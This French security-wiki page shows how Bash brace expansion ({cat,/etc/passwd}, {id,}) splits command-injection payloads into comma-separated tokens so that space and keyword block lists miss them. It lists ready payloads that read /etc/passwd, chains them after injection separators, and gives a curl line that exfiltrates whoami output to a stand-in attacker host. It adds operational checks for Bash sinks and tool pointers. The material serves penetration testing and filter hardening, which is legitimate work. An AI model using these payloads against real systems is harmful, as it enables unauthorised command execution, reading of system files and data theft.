---
order: 1
title: "Contournement de filtre d'injection de commande par expansion d'accolades"
description: "Utiliser l'expansion d'accolades de Bash, {cat,/etc/passwd}, {ls,-la}, pour scinder une commande en jetons séparés par des virgules ne transportant aucun espace ni mot-clé filtré, pour qu'une liste de blocage littérale rate le payload."
keywords:
  - injection de commande
  - expansion d'accolades
  - contournement de filtre
  - évasion de WAF
  - payload sans espace
  - bash
---

# Expansion d'accolades

L'expansion d'accolades est une construction Bash qui réécrit `{a,b,c}` en les mots séparés `a b c` **avant** tout autre traitement, avant le découpage en mots, avant même que la commande ne s'exécute. Parce que l'expansion produit elle-même les séparateurs d'arguments, `{cat,/etc/passwd}` devient `cat /etc/passwd` sans espace littéral dans le payload et sans sous-chaîne `cat /etc/passwd` contiguë qu'un filtre puisse faire correspondre. Une liste de blocage qui inspecte l'entrée brute voit un groupe d'accolades délimité par des virgules ; le shell voit une commande et son argument.

## Pourquoi le shell le normalise

L'expansion d'accolades s'exécute en premier dans l'ordre d'expansion de Bash. `{cat,/etc/passwd}` se développe en deux mots, `cat` et `/etc/passwd`, exactement comme si un espace les avait séparés. Le shell traite la virgule comme le délimiteur interne au groupe et écarte les accolades. Un filtre opérant sur la chaîne de requête ne voit jamais `cat /etc/passwd`, `cat␣`, ni aucun espace ; il voit `{cat,/etc/passwd}`, qui figure rarement sur une liste de blocage de mots-clés. Cela met en échec deux contrôles courants à la fois : les **filtres d'espaces** et les **filtres de commandes littérales**.

## Payloads

Sondes classiques, en supposant un sink POSIX/Bash où un espace ou le mot `cat` est bloqué :

```
{cat,/etc/passwd}
{cat,/etc/passwd}
{id,}
{whoami,}
{ls,-la,/}
{uname,-a}
```

Un élément vide final (`{id,}`) ne donne que `id` tout en l'enveloppant dans un groupe d'accolades, ce qui cache un mot-clé court de la correspondance par sous-chaîne.

Enchaîner un séparateur fonctionne toujours, l'expansion d'accolades se compose avec les métacaractères habituels :

```
127.0.0.1;{cat,/etc/passwd}
127.0.0.1|{id,}
```

Reconstruire le chemin d'un binaire signalé lorsque `/bin` ou les barres obliques plus le nom sont filtrés comme un bloc :

```
{/bin/cat,/etc/passwd}
{/usr/bin/id,}
```

Combinez avec d'autres astuces sans espace lorsque les accolades seules ne suffisent pas, par exemple en acheminant la sortie des accolades à travers un pipe, ou en l'associant à `${IFS}` lorsqu'un outil rejette les virgules à une position précise :

```
{curl,http://OOB_ID.attacker.example/$(whoami)}
```

Le groupe d'accolades maintient ici toute l'invocation sans espace tout en émettant un rappel hors bande qui fait aussi office de canal d'exfiltration.

## Notes opérationnelles

- L'expansion d'accolades est une fonctionnalité de **Bash/zsh**. Le `/bin/sh` POSIX pur (dash) ne l'effectue **pas**, donc confirmez que le sink lance Bash avant de vous y fier ; `{a,b}` passé à dash est une chaîne littérale.
- Aucun espace, aucune tabulation et aucun `${IFS}` ne sont requis, ce qui rend les groupes d'accolades utiles lorsque le filtre supprime ou encode les espaces.
- Gardez le groupe sous la forme `command,arg1,arg2…` ; chaque virgule devient une frontière de mot, de sorte que les flags et les chemins reçoivent chacun leur propre élément.

## Outils

- **[Burp Suite](https://portswigger.net/burp)** : Repeater pour concevoir des payloads à expansion d'accolades.
- **[commix](https://github.com/commixproject/commix)** : les scripts tamper automatisent les contournements sans espace.

## Références

- [PayloadsAllTheThings: Command Injection, Bypass without space](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Bash Reference Manual: Brace Expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html)
